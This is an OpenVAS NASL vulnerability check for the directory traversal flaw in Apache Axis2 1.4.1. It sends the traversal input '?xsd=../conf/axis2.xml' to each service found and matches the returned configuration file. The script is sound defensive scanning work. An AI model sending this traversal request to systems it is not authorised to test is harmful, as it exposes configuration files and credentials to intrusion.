###############################################################################
# OpenVAS Vulnerability Test
# $Id: sw_apache_axis2_40343.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Apache Axis2 xsd Parameter Directory Traversal Vulnerability
#
# Authors:
# Christian Fischer <info@schutzwerk.com>
#
# Copyright:
# Copyright (c) 2015 SCHUTZWERK GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (c) the respective author(s)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:apache:axis2';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111007");
  script_version("$Revision: 11872 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-03-20 08:00:00 +0100 (Fri, 20 Mar 2015)");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_bugtraq_id(40343);

  script_name("Apache Axis2 xsd Parameter Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_axis2_detect.nasl", "sw_apache_axis2_services_detect.nasl");
  script_require_ports("Services/www", 8080, 8081);
  script_mandatory_keys("axis2/installed", "axis2/services");

  script_tag(name:"solution", value:"The vendor has released fixes. Please see the references for more
 information.");
  script_tag(name:"summary", value:"Apache Axis2 is prone to a directory-traversal vulnerability because
 it fails to sufficiently sanitize user-supplied input.");
  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
 information that could aid in further attacks.");
  script_tag(name:"affected", value:"Apache Axis2 1.4.1 is vulnerable. Other versions may be affected.");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/40343");
  script_xref(name:"URL", value:"http://ws.apache.org/axis2/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12721/");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

pattern = '<axisconfig name="AxisJava2.0">';

foreach service ( get_kb_list( "axis2/services" ) ) {

   url = dir + '/services/' + service + '?xsd=../conf/axis2.xml';

   if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
     report = report_vuln_url( port:port, url:url );
     security_message( port:port, data:report );
     exit( 0 );
   }
}

exit( 99 );
